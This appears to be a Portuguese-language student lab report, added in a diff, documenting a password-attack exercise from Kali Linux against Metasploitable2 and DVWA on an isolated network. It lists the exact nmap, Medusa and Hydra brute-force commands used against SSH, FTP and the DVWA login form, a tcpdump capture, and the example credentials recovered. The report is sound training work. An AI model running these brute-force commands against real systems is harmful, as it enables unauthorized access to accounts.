@@ -1,0 +1,36 @@
+Autor: Matheus
+Data: 2025-10-07
+Ambiente:
+  - Atacante: Kali Linux (192.168.56.101)
+  - Alvo: Metasploitable2 / DVWA (192.168.56.102)
+  - Rede: VirtualBox Host-Only Adapter (isolada)
+
+Permissão:
+  Teste realizado em ambiente controlado
+  (Ex.: laboratório de VM mantido pelo aluno/instituição. Autorização: sim)
+
+Comandos executados (exatamente como rodados):
+[01] nmap -sV -p- 192.168.56.102 -oN nmap_full_scan.txt
+[02] medusa -h 192.168.56.102 -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f -O evidencias/medusa_ssh.txt
+[03] medusa -h 192.168.56.102 -u ftp -P /usr/share/wordlists/rockyou.txt -M ftp -t 4 -f -O evidencias/medusa_ftp.txt
+[04] hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^:Login" -V -o evidencias/hydra_http_dvwa.txt
+[05] sudo tcpdump -i <interface> host 192.168.56.102 and host 192.168.56.101 -w evidencias/capture_lab.pcap
+
+Resultados relevantes:
+- Nmap: portas 21, 22, 80, 443, 3306 abertas (ver nmap_full_scan.txt)
+- Medusa (SSH): possível credencial encontrada (exemplo): root:toor  — (ver evidencias/medusa_ssh.txt)
+- Medusa (FTP): login anônimo permitido (ver evidencias/medusa_ftp.txt)
+- Hydra (DVWA HTTP): credencial de exemplo encontrada: admin:password123  — (ver evidencias/hydra_http_dvwa.txt)
+- PCAP: captura salva em evidencias/capture_lab.pcap
+
+Observações:
+- DVWA estava configurado com security=low (se aplicável).
+- Registros (logs) e capturas foram gerados no momento do teste.
+- Senhas encontradas são de ambiente controlado para fins educacionais.
+
+Hashes SHA256 das evidências:
+(ver evidencias/checksums.txt)
+
+Assinatura:
+__________________________________
+Matheus Rafael
